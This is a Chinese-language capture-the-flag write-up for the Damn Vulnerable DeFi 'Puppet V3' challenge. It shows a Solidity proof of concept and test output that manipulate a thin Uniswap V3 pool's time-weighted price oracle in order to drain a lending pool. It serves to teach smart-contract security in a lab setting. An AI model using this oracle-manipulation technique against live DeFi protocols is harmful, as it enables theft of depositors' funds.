## 题目 [Puppet V3](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/puppet-v3)

无论是熊市还是牛市，真正的 DeFi 开发者都在不断建设。还记得之前你帮助过的借贷池吗？他们现在推出了一个新版本。  

这次他们使用了 Uniswap V3 作为预言机。没错，不再使用现货价格了！这次借贷池会查询资产的时间加权平均价格，并且使用了所有推荐的库。  

Uniswap 市场中有 100 WETH 和 100 DVT 的流动性，而借贷池中有一百万个 DVT 代币。  

你手上有 1 ETH 和一些 DVT，从脆弱的借贷池中拯救所有人，并将代币发送到指定的回收账户。  

注意：这个挑战需要一个有效的 RPC URL 来将主网状态分叉到你的本地环境。  

## 题解
PuppetV3Pool 是一个借贷池，允许用户通过抵押 WETH 来借出 DVT。它依赖 Uniswap V3 的时间加权平均价格（TWAP）作为预言机，用于确定借款时所需的抵押金额。用户借款时必须存入 3 倍于借款价值的 WETH 作为抵押。  

与之前一样，由于池子比较薄（100 WETH : 100 DVT），我们可以卖出所有的 DVT。TWAP 计算的是过去 10 分钟的平均价格。之后我们需要等平均价格到我们可以把借贷池掏光的时候，便发起借贷。  

POC:  
``` solidity
    function test_puppetV3() public checkSolvedByPlayer {
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        token.approve(address(swapRouter), type(uint256).max);
        weth.approve(address(lendingPool), type(uint256).max);

        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: FEE,
                recipient: player,
                deadline: block.timestamp,
                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        for (uint256 i = 0; i < 70; i++) {
            skip(1);
            if (weth.balanceOf(player) > lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)) {
                lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
                console.log("i:", i);
                break;
            }
        }

        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
```
运行测试：
```
forge test --mp test/puppet-v3/PuppetV3.t.sol -vv
```
测试结果：
```
Ran 2 tests for test/puppet-v3/PuppetV3.t.sol:PuppetV3Challenge
[PASS] test_assertInitialState() (gas: 23855)
[PASS] test_puppetV3() (gas: 1963291)
Logs:
  i: 69

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.20s (8.54ms CPU time)
```